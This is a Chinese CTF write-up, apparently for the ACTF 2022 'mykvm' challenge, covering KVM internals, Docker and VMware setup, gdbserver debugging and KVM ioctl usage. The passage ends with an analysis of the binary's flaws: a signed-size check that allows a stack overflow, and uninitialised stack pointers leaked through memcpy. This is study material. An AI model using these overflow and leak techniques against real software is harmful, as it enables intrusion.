-<p>二，kvm 是一个运行于内核空间的程序，为了提供一个整体的解决方案（包括用户空间工具集[由qemu提供]，管理各种设备[由kvm内核模块提供]），kvm 开发团队借用了 qemu 代码，并作了一些修改，形成了一套工具，也就是 qemu-kvm（不是linux中的命令） </p>
-<p>三，<code>/dev/kvm</code> 是一个字符设备，其核心作用就是让 qemu 与 kvm 内核模块结合起来，当 qemu 打开这个设备后，通过 ioctl 这个系统调用就可以获得 kvm 模块提供的三个抽象对象：</p>
-<ul>
-<li>kvm：代表 kvm 模块本身，用来管理 kvm 版本信息，创建一个 vm(通过)</li>
-<li>vm：代表一个虚拟机，通过 vm 的 io_ctl 接口，可以为虚拟机创建 vcpu，设置内存区间，创建中断控制芯片，分配中断等等</li>
-<li>vcpu：代表一个 vcpu，通过 vcpu 的 io_ctl 接口，可以启动或者暂停 vcpu，设置 vcpu 的寄存器，为 vcpu 注入中断等等</li>
-</ul>
-<p>Qemu 的使用方式:</p>
-<ul>
-<li>打开 /dev/kvm 设备</li>
-<li>通过 KVM_CREATE_VM 创建一个虚拟机对象</li>
-<li>通过 KVM_CREATE_VCPU 为虚拟机创建 vcpu 对象</li>
-<li>通过 KVM_RUN 设置 vcpu 运行起来</li>
-</ul>
-<p>因此，<code>/dev/kvm</code> 只是 kvm 内核模块提供给用户空间的一个接口，这个接口被 qemu-kvm 调用，通过 ioctl 系统调用就可以给用户提供一个工具用以创建，删除，管理虚拟机</p>
-<p><strong>Docker 搭建环境</strong></p>
-<p>题目给了 Dockerfile：</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">FROM ubuntu:16.04</span><br><span class="line"></span><br><span class="line">RUN sed -i &quot;s/http:\/\/archive.ubuntu.com/http:\/\/mirrors.tuna.tsinghua.edu.cn/g&quot; /etc/apt/sources.list &amp;&amp; \</span><br><span class="line">    apt-get update &amp;&amp; apt-get -y dist-upgrade &amp;&amp; \</span><br><span class="line">    apt-get install -y lib32z1 xinetd gdb vim python git</span><br><span class="line"></span><br><span class="line">RUN useradd -m ctf</span><br><span class="line"></span><br><span class="line">WORKDIR /home/ctf</span><br><span class="line"></span><br><span class="line">RUN cp -R /usr/lib* /home/ctf</span><br><span class="line"></span><br><span class="line">RUN mkdir /home/ctf/dev &amp;&amp; \</span><br><span class="line">    mknod /home/ctf/dev/null c 1 3 &amp;&amp; \</span><br><span class="line">    mknod /home/ctf/dev/zero c 1 5 &amp;&amp; \</span><br><span class="line">    mknod /home/ctf/dev/random c 1 8 &amp;&amp; \</span><br><span class="line">    mknod /home/ctf/dev/urandom c 1 9 &amp;&amp; \</span><br><span class="line">    chmod 666 /home/ctf/dev/*</span><br><span class="line"></span><br><span class="line">RUN mkdir /home/ctf/bin &amp;&amp; \</span><br><span class="line">    cp /bin/sh /home/ctf/bin &amp;&amp; \</span><br><span class="line">    cp /bin/ls /home/ctf/bin &amp;&amp; \</span><br><span class="line">    cp /bin/cat /home/ctf/bin</span><br><span class="line"></span><br><span class="line">COPY ./ctf.xinetd /etc/xinetd.d/ctf</span><br><span class="line">COPY ./start.sh /start.sh</span><br><span class="line">RUN echo &quot;Blocked by ctf_xinetd&quot; &gt; /etc/banner_fail</span><br><span class="line"></span><br><span class="line">RUN chmod +x /start.sh</span><br><span class="line"></span><br><span class="line">COPY ./bin/ /home/ctf/</span><br><span class="line">RUN chown -R root:ctf /home/ctf &amp;&amp; \</span><br><span class="line">    chmod -R 750 /home/ctf &amp;&amp; \</span><br><span class="line">    chmod 740 /home/ctf/flag</span><br><span class="line"></span><br><span class="line">CMD [&quot;/start.sh&quot;]</span><br><span class="line"></span><br><span class="line">EXPOSE 8888</span><br></pre></td></tr></table></figure>
-<p>在目录下执行以下命令：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker build .</span><br></pre></td></tr></table></figure>
-<p>第一个 images 就是目标了：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">ywx813@DESKTOP-I5DPK9O MINGW64 ~/Desktop/<span class="number">2022</span>暑假复现/actf2022_mykvm/docker</span><br><span class="line">$ docker images</span><br><span class="line">REPOSITORY        TAG       IMAGE ID       CREATED         SIZE</span><br><span class="line">&lt;none&gt;            &lt;none&gt;    <span class="number">94</span>c320b3bb31   <span class="number">2</span> minutes ago   <span class="number">760</span>MB</span><br><span class="line">docker_fpm        latest    <span class="number">842968b</span>ef75b   <span class="number">7</span> days ago      <span class="number">461</span>MB</span><br><span class="line">docker_nginx      latest    <span class="number">51</span>a1d3e9b89d   <span class="number">7</span> days ago      <span class="number">150</span>MB</span><br><span class="line">pwn_ubuntu20<span class="number">.04</span>   <span class="number">20.04</span>     dda29e818595   <span class="number">6</span> months ago    <span class="number">2.25</span>GB</span><br><span class="line"></span><br><span class="line">ywx813@DESKTOP-I5DPK9O MINGW64 ~/Desktop/<span class="number">2022</span>暑假复现/actf2022_mykvm/docker</span><br><span class="line">$ docker tag <span class="number">94</span>c320b3bb31 mykvm:<span class="number">16.04</span></span><br><span class="line"></span><br><span class="line">ywx813@DESKTOP-I5DPK9O MINGW64 ~/Desktop/<span class="number">2022</span>暑假复现/actf2022_mykvm/docker</span><br><span class="line">$ docker images</span><br><span class="line">REPOSITORY        TAG       IMAGE ID       CREATED         SIZE</span><br><span class="line">mykvm             <span class="number">16.04</span>     <span class="number">94</span>c320b3bb31   <span class="number">5</span> minutes ago   <span class="number">760</span>MB</span><br><span class="line">docker_fpm        latest    <span class="number">842968b</span>ef75b   <span class="number">7</span> days ago      <span class="number">461</span>MB</span><br><span class="line">docker_nginx      latest    <span class="number">51</span>a1d3e9b89d   <span class="number">7</span> days ago      <span class="number">150</span>MB</span><br><span class="line">pwn_ubuntu20<span class="number">.04</span>   <span class="number">20.04</span>     dda29e818595   <span class="number">6</span> months ago    <span class="number">2.25</span>GB</span><br></pre></td></tr></table></figure>
-<p>尝试在 docker 中运行题目文件：</p>
-<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ls</span></span><br><span class="line"><span class="string">bin</span>  <span class="string">dev</span>  <span class="string">flag</span>  <span class="string">lib</span>  <span class="string">lib32</span>  <span class="string">mykvm</span></span><br><span class="line"><span class="comment"># ./mykvm</span></span><br><span class="line"><span class="attr">your code size:</span></span><br><span class="line"><span class="number">400</span></span><br><span class="line"><span class="attr">your code:</span></span><br><span class="line"><span class="string">yhellow</span></span><br><span class="line"><span class="attr">guest name:</span> <span class="string">yhellow</span></span><br><span class="line"><span class="attr">guest passwd:</span> <span class="string">yhellow</span></span><br><span class="line"><span class="attr">mykvm:</span> <span class="string">failed</span> <span class="string">to</span> <span class="string">open</span> <span class="string">/dev/kvm</span></span><br></pre></td></tr></table></figure>
-<ul>
-<li>docker 没有 <code>/dev/kvm</code>，只能想其他办法</li>
-<li>PS：启动 docker 时需要添加 -privilage 参数，来允许在 docker 使用 kvm </li>
-</ul>
-<p><strong>VMware Workstation 16 搭建环境</strong></p>
-<p>输入下面的<code>grep</code>命令来看看是否支持硬件虚拟化： </p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  bin grep -Eoc <span class="string">&#x27;(vmx|svm)&#x27;</span> /proc/cpuinfo</span><br><span class="line"><span class="number">0</span></span><br></pre></td></tr></table></figure>
-<ul>
-<li>如果 CPU 支持硬件虚拟化，这个命令将会打印出大于“0”的数字，这代表 CPU 核心数目</li>
-<li>否则，如果输出为“0”，它意味着这个 CPU 不支持硬件虚拟化</li>
-</ul>
-<p>在一些机器上，虚拟化技术可能被厂商在 BIOS 中禁用了，运行下面的命令可以进行查看：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo /usr/sbin/kvm-ok <span class="comment">/* kvm-ok需要安装 */</span></span><br></pre></td></tr></table></figure>
-<p>也可以通过任务管理器查看：</p>
-<img src="/2022/07/12/KVM%20pwn/1657352744964.png" class width="1657352744964"> 
-<ul>
-<li>已经在BIOS中开启了VT功能</li>
-</ul>
-<p>关闭虚拟机，在虚拟机设置中勾选 <code>虚拟化引擎</code> 中的前两个：</p>
-<img src="/2022/07/12/KVM%20pwn/1657269118245.png" class width="1657269118245">  
-<p>得到报错：</p>
-<img src="/2022/07/12/KVM%20pwn/1657269160910.png" class width="1657269160910"> 
-<p>参考以下博客：</p>
-<ul>
-<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_46499134/article/details/124231658?spm=1001.2101.3001.6661.1&amp;utm_medium=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~default-1-124231658-blog-106523106.pc_relevant_multi_platform_whitelistv1&amp;depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~default-1-124231658-blog-106523106.pc_relevant_multi_platform_whitelistv1&amp;utm_relevant_index=1">关于“ VMware Workstation 16 此平台不支持虚拟化的Intel VT-x/EPT</a> </li>
-<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/Officialcareer/article/details/120800562">VMware Workstation 16 在此主机上不支持嵌套虚拟化 修复方法</a> </li>
-</ul>
-<p>最后问题终于解决了（但是 win docker 的环境挂了），要完全关闭 Hyper-V，WSL，同时还要关闭内核隔离（虚拟机访问物理资源时需要通过 VMM 去建立一个虚拟的Ring0权限，内核隔离开启后，默认会启动 Hyper-V）</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  bin grep -Eoc <span class="string">&#x27;(vmx|svm)&#x27;</span> /proc/cpuinfo</span><br><span class="line"><span class="number">16</span></span><br></pre></td></tr></table></figure>
-<p><strong>调试方法</strong></p>
-<p>为了调试环境与题目环境一样，只能使用 docker，但是 win 中的 docker 环境挂了…</p>
-<p>最后选择在 ubuntu 中下载了一个 docker，然后利用 Dockerfile 直接在 ubuntu 上搭环境：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker build -t mykvm -f Dockerfile .</span><br></pre></td></tr></table></figure>
-<p>然后即可启动，一定要后台启动才能跟远程堆环境保持一致，另外还要加 <code>--privileged</code> 参数以便在 docker 内访问 kvm 设备 </p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">➜  docker docker container run --privileged -p <span class="number">1234</span>:<span class="number">1234</span> -p <span class="number">8000</span>:<span class="number">8888</span> -d mykvm</span><br><span class="line"><span class="number">4b</span>1755d23dc28a56ffafa5ec9cbd5fc0fcb1625a90c0cde88ab3d8ebe8e71f65</span><br><span class="line">➜  docker docker exec -it <span class="number">4b</span>1755d23dc28a5 /bin/bash </span><br><span class="line">root@<span class="number">4b</span>1755d23dc2:/home/ctf# </span><br></pre></td></tr></table></figure>
-<p>接下来就可以进入 docker 使用 gdbserver 挂调试器，然后外部连入调试即可</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@<span class="number">9622b</span>ccfc102:/home/ctf<span class="meta"># ip addr show</span></span><br><span class="line"><span class="number">1</span>: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu <span class="number">65536</span> qdisc noqueue state UNKNOWN group <span class="keyword">default</span> qlen <span class="number">1000</span></span><br><span class="line">    link/loopback <span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span> brd <span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span></span><br><span class="line">    inet <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/<span class="number">8</span> scope host lo</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line"><span class="number">5</span>: eth0@if6: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu <span class="number">1500</span> qdisc noqueue state UP group <span class="keyword">default</span> </span><br><span class="line">    link/ether <span class="number">02</span>:<span class="number">42</span>:ac:<span class="number">11</span>:<span class="number">00</span>:<span class="number">02</span> brd ff:ff:ff:ff:ff:ff link-netnsid <span class="number">0</span></span><br><span class="line">    inet <span class="number">172.17</span><span class="number">.0</span><span class="number">.2</span>/<span class="number">16</span> brd <span class="number">172.17</span><span class="number">.255</span><span class="number">.255</span> scope global eth0</span><br><span class="line">       valid_lft forever preferred_</span><br></pre></td></tr></table></figure>
-<ul>
-<li>docker IP addr：172.17.0.2</li>
-</ul>
-<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">root</span>@<span class="number">9622</span>bccfc<span class="number">102</span>:/home/ctf# gdbserver <span class="number">127.0.0.1:7777</span> ./mykvm</span><br><span class="line"><span class="attribute">Process</span> ./mykvm created; pid = <span class="number">251</span></span><br><span class="line"><span class="attribute">Listening</span> <span class="literal">on</span> port <span class="number">7777</span></span><br><span class="line"><span class="attribute">Remote</span> debugging from host <span class="number">172.17.0.1</span></span><br></pre></td></tr></table></figure>
-<ul>
-<li>gdbserver port：7777</li>
-</ul>
-<p>然后再外部使用以下命令进行连接：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; target remote <span class="number">172.17</span><span class="number">.0</span><span class="number">.2</span>:<span class="number">7777</span></span><br></pre></td></tr></table></figure>
-<p><strong>KVM api 使用案例</strong></p>
-<p>首先，我们需要打开 <code>/dev/kvm</code>：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kvm = open(<span class="string">&quot;/dev/kvm&quot;</span>, O_RDWR | O_CLOEXEC);</span><br></pre></td></tr></table></figure>
-<p>接下来，我们需要创建一个虚拟机（VM），它表示与一个模拟系统关联的所有内容，包括内存和一个或多个 CPU，KVM 以文件描述符的形式为我们提供此 VM 的句柄：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vmfd = ioctl(kvm, KVM_CREATE_VM, (<span class="keyword">unsigned</span> <span class="keyword">long</span>)<span class="number">0</span>); </span><br><span class="line"><span class="comment">/* KVM_CREATE_VM:0xae01 */</span></span><br></pre></td></tr></table></figure>
-<ul>
-<li>KVM 系统提供文件描述符来控制虚拟机 </li>
-</ul>
-<p>虚拟机需要我们提供内存，对应虚拟机中的物理地址空间：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mem = mmap(<span class="literal">NULL</span>, <span class="number">0x1000</span>, PROT_READ|PROT_WRITE, MAP_SHARED|MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br></pre></td></tr></table></figure>
-<ul>
-<li>申请一页内存来保存测试代码，直接使用 mmap 获得页对齐的、初始值为 0 的内存</li>
-</ul>
-<p>将机器码复制到这块内存：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">memcpy</span>(mem, code, <span class="keyword">sizeof</span>(code));</span><br></pre></td></tr></table></figure>
-<p>使用 KVM_SET_USER_MEMORY_REGION 通知 KVM 虚拟机有4096字节的内存：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kvm_userspace_memory_region</span> <span class="title">region</span>=</span> &#123;</span><br><span class="line">    .slot = <span class="number">0</span>,</span><br><span class="line">    .guest_phys_addr= <span class="number">0x1000</span>,</span><br><span class="line">    .memory_size = <span class="number">0x1000</span>,</span><br><span class="line">    .userspace_addr = (<span class="keyword">uint64_t</span>)mem,</span><br><span class="line">&#125;;</span><br><span class="line">ret = ioctl(vmfd, KVM_SET_USER_MEMORY_REGION, &amp;region); </span><br><span class="line"><span class="comment">/* KVM_SET_USER_MEMORY_REGION:0x4020ae46 */</span></span><br></pre></td></tr></table></figure>
-<ul>
-<li>slot 字段表示 KVM 中内存空间的索引：<ul>
-<li>当我们使用相同的 slot 调用 KVM_SET_USER_MEMORY_REGION 时会替换掉这个 mapping，当使用新的 slot 调用 KVM_SET_USER_MEMORY_REGION 时会创建新的 mapping</li>
-</ul>
-</li>
-<li>guest_phys_addr 虚机中的基础物理地址</li>
-<li>userspace_addr 指向我们通过 mmap 申请的内存，注意这是一个 64-bit 的值</li>
-<li>memory_size 表示要映射的内存的大小：0x1000字节</li>
-</ul>
-<p>现在我们的 VM 中有内存，内存中有要运行的代码，现在我们创建一个 VCPU 去运行这些代码，KVM 提供给我们控制这个 VCPU 的文件描述符，0 表示虚拟 CPU 的索引，索引的最大值可通过 KVM_CAP_MAX_VCPUS 获得：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vcpufd= ioctl(vmfd, KVM_CREATE_VCPU, (<span class="keyword">unsigned</span> <span class="keyword">long</span>)<span class="number">0</span>); </span><br><span class="line"><span class="comment">/* KVM_CREATE_VCPU:0xae41 */</span></span><br></pre></td></tr></table></figure>
-<p>每个虚拟CPU都关联一个 kvm_run 结构体，这个结构体用来在内核和用户空间传递 CPU 的信息，尤其是当硬件虚拟化停止时(vmexit)，kvm_run 结构体包含停止原因</p>
-<p>我们将这个结构体通过 mmap 映射到用户空间，首先我们通过 KVM_GET_VCPU_MMAP_SIZE 得知有多少内存需要映射：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mmap_size = ioctl(kvm, KVM_GET_VCPU_MMAP_SIZE, <span class="literal">NULL</span>);</span><br><span class="line"><span class="comment">/* KVM_GET_VCPU_MMAP_SIZE:0xae04 */</span></span><br></pre></td></tr></table></figure>
-<p>一般 mmap_size 大于 kvm_run 结构体的大小，因为内核会使用这片区域去存其它的瞬态信息，使用 mmap 映射 kvm_run 结构体：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">run = mmap(<span class="literal">NULL</span>, mmap_size, PROT_READ|PROT_WRITE, MAP_SHARED, vcpufd, <span class="number">0</span>);</span><br><span class="line"><span class="comment">/* PROT_READ|PROT_WRITE:3 */</span></span><br><span class="line"><span class="comment">/* MAP_SHARED:1 */</span></span><br></pre></td></tr></table></figure>
-<p>VCPU 同样包括寄存器，KVM 将寄存器分为两类：标准寄存器和特殊寄存器，分别使用 kvm_regs 和 kvm_sregs 结构体表示，在运行我们的代码前要先初始化这个寄存器</p>
-<ul>
-<li>初始化特殊寄存器：我们只需设置 cs 寄存器，将 cs 的 base 和 selector 设为“0”</li>
-</ul>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ret = ioctl(vcpufd, KVM_GET_SREGS, &amp;sregs);</span><br><span class="line">sregs.cs.base = <span class="number">0</span>;</span><br><span class="line">sregs.cs.selector = <span class="number">0</span>;</span><br><span class="line">ret = ioctl(vcpufd, KVM_SET_SREGS, &amp;sregs);</span><br><span class="line"><span class="comment">/* KVM_SET_SREGS:0x8138ae83 */</span></span><br></pre></td></tr></table></figure>
-<ul>
-<li>初始化标准寄存器：我们大部分设为“0”，instruction pointer 设为“0x1000”，al 和 bl 设为“2”，flags 寄存器设置为“2”</li>
-</ul>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kvm_regs</span> <span class="title">regs</span> =</span> &#123;</span><br><span class="line">    .rip = <span class="number">0x1000</span>,</span><br><span class="line">    .rax = <span class="number">2</span>,</span><br><span class="line">    .rbx = <span class="number">2</span>,</span><br><span class="line">    .rflags = <span class="number">0x2</span>,</span><br><span class="line">&#125;;</span><br><span class="line">ret = ioctl(vcpufd, KVM_SET_REGS, &amp;regs);</span><br><span class="line"><span class="comment">/* KVM_SET_REGS:0x4090ae82 */</span></span><br></pre></td></tr></table></figure>
-<p>创建 VM 和 VCPU、映射和初始化内存、并设置初始寄存器状态后，我们现在可以使用 KVM_RUN 开始使用 VCPU 运行指令</p>
-<p>每次虚拟化停止时，它都会返回，因此我们将在循环中运行它：（根据停止原因进行相应的处理）</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span>(<span class="number">1</span>) &#123;</span><br><span class="line">    ret = ioctl(vcpufd, KVM_RUN, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="comment">/* KVM_RUN:0xae80 */</span></span><br><span class="line">    <span class="keyword">switch</span> (run-&gt;exit_reason) &#123; <span class="comment">/* kvm_run结构体包含停止原因 */</span></span><br><span class="line">        <span class="comment">/* Handle exit */</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p>参考：</p>
-<ul>
-<li><a target="_blank" rel="noopener" href="https://lwn.net/Articles/658511/">使用 KVM API</a></li>
-<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/zhang_syi/article/details/52718329?spm=1001.2014.3001.5502">KVM学习1—安装编译测试kvm模块</a> </li>
-<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/zhang_syi/article/details/52718366">KVM学习2—使用KVM API创建并运行虚拟机</a> </li>
-<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/zhang_syi/article/details/52718377?spm=1001.2014.3001.5502">KVM学习3—编写简单在虚拟机中学习的汇编程序</a> </li>
-</ul>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ioctl</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">unsigned</span> <span class="keyword">long</span> request, ...)</span></span>;</span><br></pre></td></tr></table></figure>
-<ul>
-<li>fd：文件描述符 </li>
-<li>request：命令码，应用程序通过下发命令码来控制驱动程序完成对应操作</li>
-<li>“…”：是可变参数 arg，一些情况下应用程序需要向驱动程序传参，参数就通过 ag 来传递</li>
-<li>返回值：驱动程序中 ioctl 接口给的返回值，驱动程序可以通过返回值向用户程序传参，ioctl 运行失败时一定会返回“-1”并设置全局变量 errorno</li>
-</ul>
-<p><strong>关于汇编的知识</strong></p>
-<p>MOVZX 指令（进行全零扩展并传送）将源操作数复制到目的操作数，并把目的操作数0扩展到16位或32位（这条指令只用于无符号整数）</p>
-<ul>
-<li>下图展示了如何将源操作数进行全零扩展，并送入16位目的操作数：</li>
-</ul>
-<img src="/2022/07/12/KVM%20pwn/1657603737686.png" class width="1657603737686"> 
-<p>MOVSX 指令（进行符号扩展并传送）将源操作数内容复制到目的操作数，并把目的操作数符号扩展到16位或32位（这条指令只用于有符号整数）</p>
-<ul>
-<li>下图展示了如何将源操作数进行符号扩展（符号位为“1”），并送入16位目的操作数：</li>
-</ul>
-<img src="/2022/07/12/KVM%20pwn/1657603860296.png" class width="1657603860296"> 
-<p>全零扩展：零扩展就是全补零，不论其符号位是多少，高位全都补 “0”</p>
-<p>符号扩展：当用更多的内存存储某一个有符号数时，由于符号位位于该数的第一位，扩展之后，符号位仍然需要位于第一位：</p>
-<ul>
-<li>当扩展一个负数时，需要将扩展的高位全赋为 “1”</li>
-<li>当扩展一个正数时（包括无符号数），符号扩展和零扩展是一样的，因为符号位就是 “0”</li>
-</ul>
-<p>案例：</p>
-<ul>
-<li>用8位二进制表示 “-1”，则是  11111111 </li>
-<li>用16位二进制表示时，则为 11111111 11111111 高位全都是 “1”，这个叫做符号扩展，主要用于对齐操作数</li>
-</ul>
-<p>汇编语言中，CPU 对外设的操作通过专门的端口读写指令来完成：读端口用 IN 指令，写端口用 OUT 指令</p>
-<p><strong>漏洞分析</strong></p>
-<p>漏洞点一：负数溢出</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;your code size: &quot;</span>);</span><br><span class="line">__isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;kvm);                 <span class="comment">// int</span></span><br><span class="line"><span class="keyword">if</span> ( kvm.size &lt;= <span class="number">4096</span> )                     <span class="comment">// int</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;your code: &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, kvm.code, kvm.size);              <span class="comment">// unsigned int,负数溢出</span></span><br><span class="line">  kvm.name = input_line(<span class="string">&quot;guest name: &quot;</span>);</span><br><span class="line">  kvm.name = input_line(<span class="string">&quot;guest passwd: &quot;</span>);</span><br><span class="line">  pwn(kvm.code, kvm.size);</span><br><span class="line">  kvm.name = input_line(<span class="string">&quot;host name: &quot;</span>);</span><br><span class="line">  <span class="built_in">memcpy</span>(dest, kvm.name, <span class="number">0x20</span>uLL);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Bye!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<ul>
-<li>令 kvm.size = -1，下一个 read 就会有栈溢出</li>
-<li>不过有 canary 的限制，不能直接利用</li>
-</ul>
-<p>漏洞点二：没有置空</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Struct kvm; <span class="comment">// [rsp+4h] [rbp-101Ch] BYREF</span></span><br><span class="line"><span class="keyword">unsigned</span> __int64 canary; <span class="comment">// [rsp+1018h] [rbp-8h]</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<ul>
-<li>Struct kvm 在栈上占用的范围很大，其中包含了大量存留指针</li>
-</ul>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">memcpy</span>(</span><br><span class="line">  (&amp;code_bss - (((((&amp;code_bss &gt;&gt; <span class="number">0x1F</span>) &gt;&gt; <span class="number">0x14</span>) + &amp;code_bss) &amp; <span class="number">0xFFF</span>) - ((&amp;code_bss &gt;&gt; <span class="number">0x1F</span>) &gt;&gt; <span class="number">0x14</span>)) + <span class="number">0x1000</span>),</span><br><span class="line">  code,</span><br><span class="line">  size);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<ul>
-<li>memcpy 中的 size 我们可以控制</li>
-<li>只要 size 足够大，就可以把栈上的指针 copy 到 bss 段（方便后续利用）</li>
